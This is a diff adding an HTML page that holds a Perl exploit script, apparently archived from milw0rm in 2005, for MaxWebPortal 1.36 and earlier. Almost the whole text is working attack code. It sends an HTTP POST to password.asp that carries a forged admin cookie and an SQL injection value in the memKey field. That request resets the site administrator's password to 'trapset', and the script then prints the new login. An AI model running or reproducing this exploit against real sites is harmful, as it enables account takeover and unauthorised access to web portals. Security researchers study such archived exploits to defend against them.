@@ -1,0 +1,76 @@
+<html><head><title>Maxwebportal <= 1.36 password.asp Change Password Exploit (3 - perl)</title></head><pre>#!/usr/bin/perl
+#################################################################
+#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
+#################################################################
+# EXPLOIT FOR - MAX Portal (All Versions)
+#
+#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v );
+#E-Mail : Alpha_Programmer@Yahoo.com
+#
+#This Xpl Change Admin's Pass in This Portal !!
+#
+#Discovered by: s d &lt;irsdl@yahoo.com&gt;
+#
+#################################################################
+#  Gr33tz To ==&gt;   mh_p0rtal , Oil_karchack , Str0ke   &amp;  AlphaST.Com
+#
+#And Iranian Hacking &amp; Security Teams :
+# IHS , Shabgard , Emperor ,Crouz &amp; Simorgh-ev
+#################################################################
+use IO::Socket;
+
+if (@ARGV &lt; 2)
+{
+ print &quot;\n==========================================\n&quot;;
+ print &quot; \n     -- Exploit By Alpha Programmer --\n\n&quot;;
+ print &quot;     Trap-Set Underground Hacking Team      \n\n&quot;;
+ print &quot;      Usage: Max.pl &lt;T4rg3t&gt; &lt;V3rsion&gt;\n\n&quot;;
+ print &quot; V3rsion :\n&quot;;
+ print &quot; 1 ==&gt;   Version 1.35 and 0lder\n&quot;;
+ print &quot; 2 ==&gt;   Version 1.36, 2.0 and Next\n&quot;;
+ print &quot;==========================================\n\n&quot;;
+ print &quot;Example:\n\n&quot;;
+ print &quot;    Max.pl www.Site.com 1\n&quot;;
+ exit();
+}
+$hell = &quot;foo' or M_Name='admin&quot;;
+if ($ARGV[1] =~&quot;2&quot; ){$hell = &quot;foo%27%29+or+M_Name%3D%27admin%27+or+%28%271%27%3D%272&quot;};
+
+
+my $host = $ARGV[0];
+my $remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host,
+PeerPort =&gt; &quot;80&quot; );
+
+unless ($remote) { die &quot;C4nn0t C0nn3ct to $host&quot; }
+
+print &quot;C0nn3cted\n&quot;;
+
+$http = &quot;POST /password.asp?mode=reset HTTP/1.0&quot;;
+$http .= &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n&quot;;
+$http .= &quot;Accept-Language: fa\n&quot;;
+$http .= &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+$http .= &quot;Pragma: no-cache\n&quot;;
+$http .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)\n&quot;;
+$http .= &quot;Host: $host\n&quot;;
+$http .= &quot;Content-Length: 111\n&quot;;
+$http .= &quot;Proxy-Connection: Keep-Alive\n&quot;;
+$http .= &quot;Cookie: SSOComhide=Name=admin; SSOComUser=Cookies=&amp;Pword=d7fae5da3d785535c12b70865519ba86&amp;Name=admin\n\n&quot;;
+
+$http .= &quot;pass=trapset&amp;pass2=trapset&amp;memId=-1&amp;memKey=$hell&amp;Submit=Submit\n\n\n\n&quot;;
+
+print &quot;\n&quot;;
+print $remote $http;
+sleep(1);
+print &quot;[+] Attacking ...\n&quot;;
+print &quot;[+] Changing Admin's Password ...\n&quot;;
+while (&lt;$remote&gt;)
+{
+}
+print &quot;\nNow Go to $host and Login With :\n\n&quot;;
+print &quot;User: admin\n&quot;;
+print &quot;Pass: trapset\n\n&quot;;
+print &quot;Enjoy ;)\n&quot;;
+print &quot;\n&quot;;
+### EOF ###
+
+# milw0rm.com [2005-05-26]</pre></html>
